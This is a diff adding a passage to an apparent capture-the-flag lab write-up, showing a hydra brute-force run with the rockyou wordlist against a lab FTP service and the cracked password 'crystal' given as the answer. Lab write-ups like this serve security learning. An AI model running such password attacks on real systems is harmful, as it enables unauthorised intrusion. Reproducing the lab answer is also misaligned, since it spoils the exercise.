@@ -93,3 +93,25 @@ chris
 
 lets crack chris' FTP password using hydra
 
+```
+kali@kali:~$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.206.40 -t 4 ftp
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-27 00:10:39
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ftp://10.10.206.40:21/
+[STATUS] 60.00 tries/min, 60 tries in 00:01h, 14344339 to do in 3984:33h, 4 active
+[STATUS] 57.33 tries/min, 172 tries in 00:03h, 14344227 to do in 4169:51h, 4 active
+[21][ftp] host: 10.10.206.40   login: chris   password: crystal
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-27 00:15:12
+
+```
+
+answer
+
+```
+crystal
+```
+
+### Zip file password
